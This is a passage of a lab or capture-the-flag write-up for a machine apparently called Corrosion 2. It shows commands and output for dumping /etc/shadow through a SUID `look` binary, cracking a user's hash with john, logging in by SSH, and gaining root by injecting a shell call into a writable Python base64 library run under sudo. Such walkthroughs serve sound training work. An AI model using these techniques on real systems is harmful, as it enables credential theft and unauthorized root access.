## 5. Shadow Dump via SUID look

jaye's `Files/` directory has a SUID root binary:

<TerminalOutput
  cmd="ls -al ~/Files"
  output={`---s--s--x 1 root root 14728 Sep 17 2021 look`}
/>

`look` reads lines from a file beginning with a given string. An empty prefix matches every line — so this dumps all of `/etc/shadow`:

<TerminalOutput
  cmd="./look '' /etc/shadow"
  rawHref="/writeups/raw/corrosion-2/shadow-randy.txt"
  output={`root:$6$fHvHhNo5DWsYxgt0$...
randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/...
jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/...`}
/>

Crack randy's hash:

<TerminalOutput
  cmd="john --wordlist=rockyou.txt randy.hash"
  output={`07051986randy  (randy)`}
/>

<TerminalOutput
  cmd="ssh randy@10.0.0.21"
  output={`randy@10.0.0.21's password:

randy@corrosion:~$`}
/>

## 6. Privilege Escalation — randy → root

<TerminalOutput
  cmd="sudo -l"
  output={`(root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py`}
/>

Randy can sudo `randombase64.py` as root with their own password. The script imports `base64`. Check if that library is writable:

<TerminalOutput
  cmd="find /usr/lib/python3.8 -writable 2>/dev/null"
  output={`/usr/lib/python3.8/base64.py`}
/>

It is. Open `base64.py` and inject `os.system("/bin/bash")` inside the `b64encode` function — it runs when the script imports and calls anything from base64:

<Screenshot
  src="/screenshots/corrosion-2/base64-injected.png"
  alt="nano editor open on /usr/lib/python3.8/base64.py with os.system('/bin/bash') injected inside b64encode"
  caption="os.system('/bin/bash') dropped into b64encode — sudo will execute this as root"
/>

<TerminalOutput
  cmd="sudo /usr/bin/python3.8 /home/randy/randombase64.py"
  output={`Enter your string: sad
root@corrosion:/home/randy#`}
/>
